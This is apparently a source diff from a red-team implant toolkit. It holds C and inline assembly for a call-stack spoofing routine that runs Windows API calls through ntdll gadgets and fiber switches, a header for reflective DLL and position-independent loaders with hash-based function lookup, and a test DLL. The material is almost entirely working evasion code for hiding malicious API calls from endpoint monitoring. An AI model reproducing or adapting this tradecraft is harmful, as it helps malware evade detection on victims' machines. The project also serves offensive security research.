+void stitchMain(PSTITCH_ARG arg) {
+    __asm volatile (
+        "mov rcx, [rbx + 144]\n"               // ret_fiber = fiber to switch to
+        "mov rax, [__imp_KERNEL32$SwitchToFiber]\n"
+        "call rax\n"
+
+        "mov r10, rbx\n"
+        "lea rax, [rip + stitchFixup]\n"
+        "mov qword ptr [r10 + 104], rax\n"      // gadget.jmp_ret slot = &stitchMain
+        "mov qword ptr [r10 + 128], rsi\n"      // save rsi at STITCH_ARG.rsi_save
+
+        "add rsp, [r10 + 152]\n"                // rsp_disp = stack adjustment for gadget call
+
+        "lea r11, [r10 + 16]\n"                 // &func_call.argv
+        "mov rax, [r10 + 8]\n"                  // func_call.argc
+        "dec rax\n"                             // 0-indexed last arg
+        "mov rcx, rax\n"                        // stack slot index
+        "sub rcx, 4\n"
+
+        ".stack_args:\n"
+        "cmp rax, 4\n"
+        "jl .done\n"
+        "mov r8, [r11 + rax*8]\n"
+        "mov qword ptr [rsp + rcx*8 + 0x20], r8\n"
+        "dec rax\n"
+        "dec rcx\n"
+        "jmp .stack_args\n"
+
+        ".done:\n"
+        "lea rax, [r10]\n"                      // &func_call.function = pointer to target function ptr
+        "movsxd rdx, dword ptr [r10 + 120]\n"   // call displacement (gadget.call_disp)
+        "sub rax, rdx\n"                        // apply displacement
+
+        "movsx rdx, byte ptr [r10 + 124]\n"     // jmp displacement (gadget.jmp_disp)
+        "lea rsi, [r10 + 104]\n"                // &gadget.jmp_ret slot (holds continuation)
+        "sub rsi, rdx\n"
+
+        "mov rcx, [r11]\n"                      // func_call.argv[0]
+        "mov rdx, [r11 + 8]\n"                  // func_call.argv[1]
+        "mov r8,  [r11 + 16]\n"                 // func_call.argv[2]
+        "mov r9,  [r11 + 24]\n"                 // func_call.argv[3]
+        "jmp [r10 + 96]\n"                      // gadget.call
+    );
+}
+
+__attribute__((naked))
+void stitchFixup() {
+    __asm (
+        "sub rsp, [rbx + 152]\n"
+        "mov [rbx + 160], rax\n"
+        "jmp stitchMain\n"
+    );
+}
+
+PRUNTIME_FUNCTION getRuntimeFunction(LPVOID address, PDWORD64 p_image_base) {
+    DWORD64 image_base = 0;
+    UNWIND_HISTORY_TABLE history_table = { 0 };
+    PRUNTIME_FUNCTION p_runtime_function = KERNEL32$RtlLookupFunctionEntry((DWORD64)address, &image_base, &history_table);
+    if (p_runtime_function == NULL) {
+    }
+    if (p_image_base != NULL) *p_image_base = image_base;
+    return p_runtime_function;
+}
+
+DWORD getFrameSize(PRUNTIME_FUNCTION p_runtime_function, DWORD64 image_base) {
+    UBYTE i = 0;
+    STACK_FRAME frame = { 0 };
+    PUNWIND_INFO p_unwind_info = (PUNWIND_INFO)(p_runtime_function->UnwindData + image_base);
+    for (; i < p_unwind_info->CountOfCodes; i++) {
+        ULONG unwind_op = p_unwind_info->UnwindCode[i].UnwindOp;
+        ULONG op_info = p_unwind_info->UnwindCode[i].OpInfo;
+
+        switch (unwind_op) {
+            case UWOP_PUSH_NONVOL:
+                frame.size += 8;
+                if (op_info == RBP_OP_INFO) {
+                    frame.pushed_rbp = TRUE;
+                    frame.code_count = p_unwind_info->CountOfCodes;
+                }
+                break;
+            case UWOP_SAVE_NONVOL:
+                i += 1;
+                break;
+            case UWOP_ALLOC_SMALL:
+                frame.size += ((op_info * 8) + 8);
+                break;
+            case UWOP_ALLOC_LARGE:
+                i += 1;
+                ULONG frame_offset = p_unwind_info->UnwindCode[i].FrameOffset;
+                if (op_info == 0) frame_offset *= 8;
+                else {
+                    i += 1;
+                    frame_offset += (p_unwind_info->UnwindCode[i].FrameOffset << 16);
+                }
+                frame.size += frame_offset;
+            case UWOP_SET_FPREG:
+                frame.sets_fp = TRUE;
+                break;
+            case UWOP_SAVE_XMM128:
+                i += 1;
+                break;
+            case UWOP_SAVE_XMM128_FAR:
+                i += 2;
+                break;
+            default:
+                break;
+        }
+    }
+
+    if ((p_unwind_info->Flags & UNW_FLAG_CHAININFO) != 0) {
+        i = p_unwind_info->CountOfCodes;
+        if ((i & 1) != 0) i += 1;
+        p_runtime_function = (PRUNTIME_FUNCTION)(&p_unwind_info->UnwindCode[i]);
+        return getFrameSize(p_runtime_function, image_base);
+    }
+
+    //frame.size += 8;
+
+    return frame.size;
+}
+
+UINT_PTR getText(HMODULE h_module, OUT PUINT_PTR end) {
+    UINT_PTR base = (UINT_PTR)h_module;
+    PIMAGE_DOS_HEADER dos_hdr = (PIMAGE_DOS_HEADER)base;
+    if (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
+
+    PIMAGE_NT_HEADERS nt_hdr = (PIMAGE_NT_HEADERS)(base + dos_hdr->e_lfanew);
+    if (nt_hdr->Signature != IMAGE_NT_SIGNATURE) return FALSE;
+
+    PIMAGE_SECTION_HEADER sec_hdr = IMAGE_FIRST_SECTION(nt_hdr);
+
+    UINT_PTR text_start = 0;
+    UINT_PTR text_end = 0;
+    for (WORD i = 0; i < nt_hdr->FileHeader.NumberOfSections; i++) {
+        if (_memcmp(sec_hdr[i].Name, ".text", 6)) {
+            text_start = base + sec_hdr[i].VirtualAddress;
+            text_end = text_start + sec_hdr[i].Misc.VirtualSize;
+            break;
+        }
+    }
+    *end = text_end;
+    return text_start;
+}
+
+BOOL findGadget(HMODULE h_module, OUT PGADGET gadget, SIZE_T max_frame_size) {
+    //dprintf("[+] findGadget2\n");
+    SIZE_T text_end = 0;
+    PBYTE text_start = (PBYTE)getText(h_module, &text_end);
+
+    // This could be expaned for other registers and displacements probably
+    BYTE call[2] = { 0xFF, 0x90 }; // call [rax +/- 32_disp]
+    BYTE jmp[2] = { 0xFF, 0x66 };  // jmp [rsi +/- 8_disp]
+    for (PBYTE i = (PBYTE)text_start; (UINT_PTR)i < text_end; i++) {
+        if (_memcmp(i, call, 2) && _memcmp(i + 6, jmp, 2)) {
+            PRUNTIME_FUNCTION p_runtime_func = getRuntimeFunction(i, NULL);
+            if (p_runtime_func == NULL) {
+                //dprintf("[!] No unwind data for gadget\n");
+                continue;
+            }
+            gadget->frame_size = getFrameSize(p_runtime_func, (DWORD64)h_module);
+            if (gadget->frame_size == -1 || gadget->frame_size > max_frame_size) {
+                //dprintf("[!] Gadget frame too large\n");
+                continue;
+            }
+
+            gadget->call = i;
+            gadget->jmp_ret = (UINT_PTR)0;
+            gadget->call_disp = *(PINT32)(i+2);
+            gadget->jmp_disp = *(PINT8)(i+8);
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+UINT_PTR stitch(LPVOID function, DWORD argc, ...) {
+    FUNC_CALL func_call = { 0 };
+    func_call.function = (UINT_PTR)function;
+    func_call.argc = argc;
+    va_list args;
+    va_start(args, argc);
+    for (DWORD i = 0; i < argc; i++) {
+        func_call.argv[i] = va_arg(args, UINT_PTR);
+    }
+    va_end(args);
+    g_stitch_args->func_call = func_call;
+
+    GADGET gadget = { 0 };
+    getGadget(&gadget, g_stitch_args->go_frame_size);
+    g_stitch_args->gadget = gadget;
+    g_stitch_args->rsp_disp = (g_stitch_args->go_frame_size - gadget.frame_size);
+
+    //dprintf("[+] GO: %d\tGadget: %d\n", g_stitch_args->go_frame_size, gadget.frame_size);
+
+    KERNEL32$SwitchToFiber(g_clean_state);
+
+    return g_stitch_args->ret;
+}
+
+VOID getGadget(PGADGET p_gadget, SIZE_T max_frame_size) {
+    DWORD needed = 0;
+    if (!KERNEL32$K32EnumProcessModulesEx((HANDLE)-1, NULL, 0, &needed, LIST_MODULES_ALL)) {
+        //dprintf("[getImages] %lu\n", KERNEL32$GetLastError());
+    }
+
+    HMODULE* modules = NTDLL$RtlAllocateHeap(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, needed);
+    if (!KERNEL32$K32EnumProcessModulesEx((HANDLE)-1, modules, needed, &needed, LIST_MODULES_ALL)) {
+        //dprintf("[getImages][2] %lu\n", KERNEL32$GetLastError());
+    }
+
+    for (int i = 0; i < needed/sizeof(HMODULE); i++) {
+        if (modules[i] == NULL) continue;
+
+        if (!findGadget(KERNEL32$GetModuleHandleA("ntdll.dll"), p_gadget, max_frame_size))
+            continue;
+        else {
+            //dprintf("[+] Found gadget %s : 0x%p : 0x%x\n", modules[i], p_gadget->call, p_gadget->frame_size);
+            break;
+        }
+    } if (p_gadget->call == 0) {
+        return;
+    }
+}
+
+UINT_PTR findReturnAddressOffset(UINT_PTR ret_addr, UINT_PTR rsp) {
+    ULONG_PTR low, high;
+    KERNELBASE$GetCurrentThreadStackLimits(&low, &high);
+
+    for (UINT_PTR rspi = (UINT_PTR)rsp; rspi < high; rspi += sizeof(UINT_PTR)) {
+        if (*(PUINT_PTR)rspi == (UINT_PTR)ret_addr) return rspi - (UINT_PTR)rsp;
+    }
+    return 0;
+}
+
+
+```
+
+`src/stitch.h`:
+
+```h
+#pragma once
+
+#include <windows.h>
+
+typedef struct _FUNC_CALL {
+    UINT_PTR function;
+    UINT_PTR argc;
+    UINT_PTR argv[10];
+} FUNC_CALL, PFUNC_CALL;
+
+typedef struct _GADGET {
+    LPVOID call;            // 0
+    UINT_PTR jmp_ret;       // 8
+    UINT_PTR frame_size;    // 16
+    INT32 call_disp;        // 24
+    INT8 jmp_disp;          // 28
+} GADGET, *PGADGET;
+
+typedef struct STITCH_ARG {
+    FUNC_CALL func_call; // 0
+    GADGET gadget;       // 96
+    UINT_PTR rsi_save;   // 128
+    UINT_PTR rbx_save;   // 136
+    UINT_PTR ret_fiber;  // 144
+    UINT_PTR rsp_disp;   // 152
+    UINT_PTR ret;        // 160
+    DWORD go_frame_size;
+} STITCH_ARG, *PSTITCH_ARG;
+
+typedef struct {
+    DWORD size;
+    BOOL pushed_rbp;
+    ULONG code_count;
+    BOOL sets_fp;
+} STACK_FRAME;
+
+//UINT_PTR stitch(HANDLE h_thread, LPVOID function, DWORD argc, ...);
+UINT_PTR stitch(LPVOID function, DWORD argc, ...);
+VOID getGadget(PGADGET p_gadget, SIZE_T max_frame_size);
+void stitchMainStub(PSTITCH_ARG arg);
+void stitchFixup();
+UINT_PTR findReturnAddressOffset(UINT_PTR ret_addr, UINT_PTR rsp);
+
+
+```
+
+`src/tcg.h`:
+
+```h
+/*
+ * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
+ *
+ * Redistribution and use in source and binary forms, with or without modification, are
+ * permitted provided that the following conditions are met:
+ *
+ * 1. Redistributions of source code must retain the above copyright notice, this list of
+ * conditions and the following disclaimer.
+ *
+ * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
+ * conditions and the following disclaimer in the documentation and/or other materials provided
+ * with the distribution.
+ *
+ * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
+ * endorse or promote products derived from this software without specific prior written
+ * permission.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
+ * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+ * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+ * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
+ * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+ * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
+ * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
+ * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ */
+
+#pragma once
+
+// used by both the Pico Loader and DLL loader
+typedef struct {
+	__typeof__(LoadLibraryA)   * LoadLibraryA;
+	__typeof__(GetProcAddress) * GetProcAddress;
+} IMPORTFUNCS;
+
+// used throughout TCG and useful for parsing preplen'd content
+typedef struct {
+        int   length;
+        char  value[];
+} _RESOURCE;
+
+// linker intrinsic to map a function hash to a hook registered via Crystal Palace
+FARPROC __resolve_hook(DWORD funcHash);
+
+/*
+ * Structs used by our DLL loader
+ */
+
+#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
+#define DEREF( name )*(UINT_PTR *)(name)
+
+typedef struct {
+	IMAGE_DOS_HEADER      * DosHeader;
+	IMAGE_NT_HEADERS      * NtHeaders;
+	IMAGE_OPTIONAL_HEADER * OptionalHeader;
+} DLLDATA;
+
+/*
+ * utility functions
+ */
+DWORD adler32sum(unsigned char * buffer, DWORD length);
+DWORD ror13hash(const char * c);
+
+/*
+ * printf-style debugging.
+ */
+void dprintf(char * format, ...);
+
+/*
+ * PICO running functions
+ */
+typedef void (*PICOMAIN_FUNC)(char * arg);
+
+PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
+PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
+int PicoCodeSize(char * src);
+int PicoDataSize(char * src);
+void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
+_RESOURCE * PicoGetUnwindData(char * src, char * base);
+
+/*
+ * Resolve functions by walking the export address table
+ */
+FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
+HANDLE findModuleByHash(DWORD moduleHash);
+
+/*
+ * DLL parsing and loading functions
+ */
+typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);
+
+DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
+IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
+void LoadDLL(DLLDATA * dll, char * src, char * dst);
+void LoadSections(DLLDATA * dll, char * src, char * dst);
+void ParseDLL(char * src, DLLDATA * data);
+void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
+void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
+DWORD SizeOfDLL(DLLDATA * data);
+
+/*
+ * A macro to figure out our caller
+ * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
+ */
+#ifdef __MINGW32__
+#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
+#else
+#pragma intrinsic(_ReturnAddress)
+#define WIN_GET_CALLER() _ReturnAddress()
+#endif
+
+```
+
+`src/test_dll.c`:
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
+{
+    switch (reason) {
+        case DLL_PROCESS_ATTACH:
+            MessageBoxA(NULL, "Bingus", "msgbox_dll", MB_OK);
+            while (TRUE) {
+                DWORD ms = GetTickCount() % 15000;
+                Sleep(ms);
+            }
+            break;
+    }
+    return TRUE;
+}
+
+```
+
+`src/unwind.h`:
+
+```h
+#include <windows.h>
+
+#define RBP_OP_INFO 0x5
+
+typedef enum _UNWIND_OP_CODES {
+    UWOP_PUSH_NONVOL = 0, /* info == register number */
+    UWOP_ALLOC_LARGE,     /* no info, alloc size in next 2 slots */
+    UWOP_ALLOC_SMALL,     /* info == size of allocation / 8 - 1 */
+    UWOP_SET_FPREG,       /* no info, FP = RSP + UNWIND_INFO.FPRegOffset*16 */
+    UWOP_SAVE_NONVOL,     /* info == register number, offset in next slot */
+    UWOP_SAVE_NONVOL_FAR, /* info == register number, offset in next 2 slots */
+    UWOP_SAVE_XMM128 = 8, /* info == XMM reg number, offset in next slot */
+    UWOP_SAVE_XMM128_FAR, /* info == XMM reg number, offset in next 2 slots */
+    UWOP_PUSH_MACHFRAME   /* info == 0: no error-code, 1: error-code */
+} UNWIND_CODE_OPS;
+
+typedef unsigned char UBYTE;
+
+typedef union _UNWIND_CODE {
+    struct {
+        UBYTE CodeOffset;
+        UBYTE UnwindOp : 4;
+        UBYTE OpInfo   : 4;
+    };
+    USHORT FrameOffset;
+} UNWIND_CODE, *PUNWIND_CODE;
+
+typedef struct _UNWIND_INFO {
+    UBYTE Version       : 3;
+    UBYTE Flags         : 5;
+    UBYTE SizeOfProlog;
+    UBYTE CountOfCodes;
+    UBYTE FrameRegister : 4;
+    UBYTE FrameOffset   : 4;
+    UNWIND_CODE UnwindCode[1];
+/*  UNWIND_CODE MoreUnwindCode[((CountOfCodes + 1) & ~1) - 1];
+*   union {
+*       OPTIONAL ULONG ExceptionHandler;
+*       OPTIONAL ULONG FunctionEntry;
+*   };
+*   OPTIONAL ULONG ExceptionData[]; */
+} UNWIND_INFO, *PUNWIND_INFO;
+
+
+```
